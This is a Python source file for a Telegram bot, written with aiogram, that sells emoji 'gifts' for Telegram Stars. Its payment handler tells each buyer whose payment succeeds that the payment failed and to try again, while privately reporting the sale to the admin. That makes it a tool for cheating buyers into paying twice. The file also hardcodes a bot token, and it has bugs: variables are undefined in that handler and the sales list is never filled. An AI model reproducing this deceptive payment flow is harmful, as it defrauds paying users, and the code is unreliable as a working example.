import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LabeledPrice,
    PreCheckoutQuery
)

TOKEN = "8614684488:AAFlWlgEm6CcuVaq5kJe8te0PuYHV0Wead8"
ADMIN_ID = 5349252067  # вставь свой telegram id

bot = Bot(TOKEN)
dp = Dispatcher()

# список подарков
gifts = {
    "bear": ("🧸 Мишка", 15),
    "giftbox": ("🎁 Подарочная коробка", 25),
    "ring": ("💍 Обручальное кольцо", 100),
    "diamond": ("💎 Бриллиант", 100),
    "heart": ("❤️ Сердце", 15),
    "flowers": ("💐 Букет цветов", 50),
    "rose": ("🌹 Роза", 25),
    "champagne": ("🍾 Шампанское", 50),
    "cup": ("🏆 Кубок", 100),
    "rocket": ("🚀 Ракета", 50),
}

sales = []

# клавиатура подарков
def gifts_keyboard():
    buttons = []
    for key, value in gifts.items():
        name, price = value
        buttons.append(
            [InlineKeyboardButton(
                text=f"{name} — {price} ⭐",
                callback_data=key
            )]
        )
    return InlineKeyboardMarkup(inline_keyboard=buttons)


# старт
@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "✅ Отлично! Теперь вы можете использовать бота.\n\nВыбери подарок:",
        reply_markup=gifts_keyboard()
    )


# выбор подарка
@dp.callback_query()
async def gift_selected(callback: types.CallbackQuery):

    gift_id = callback.data
    name, price = gifts[gift_id]

    prices = [LabeledPrice(label=name, amount=price)]

    await bot.send_invoice(
        chat_id=callback.from_user.id,
        title=name,
        description=f"{name} за {price} звёзд",
        payload=gift_id,
        provider_token="",
        currency="XTR",
        prices=prices
    )

    await callback.answer()


# проверка перед оплатой
@dp.pre_checkout_query()
async def pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


# после успешной оплаты
@dp.message()
async def successful_payment(message: types.Message):

    if message.successful_payment:

        await message.answer(
            "❌ Ошибка оплаты.\nПопробуйте ещё раз."
        )
        await bot.send_message(
            ADMIN_ID,
            f"💰 Новая покупка\n\n"
            f"Пользователь: {message.from_user.id}\n"
            f"Подарок: {name}\n"
            f"Цена: {price}⭐"
        )


# админ панель
@dp.message(Command("admin"))
async def admin(message: types.Message):

    if message.from_user.id != ADMIN_ID:
        return

    await message.answer(
        "👑 Админ панель\n\n"
        "/sales — посмотреть продажи"
    )


# список продаж
@dp.message(Command("sales"))
async def sales_list(message: types.Message):

    if message.from_user.id != ADMIN_ID:
        return

    if not sales:
        await message.answer("Продаж пока нет")
        return

    text = "📊 Продажи:\n\n"

    for s in sales:
        text += f"{s[0]} купил {s[1]} за {s[2]}⭐\n"

    await message.answer(text)


async def main():
    await dp.start_polling(bot)


asyncio.run(main())
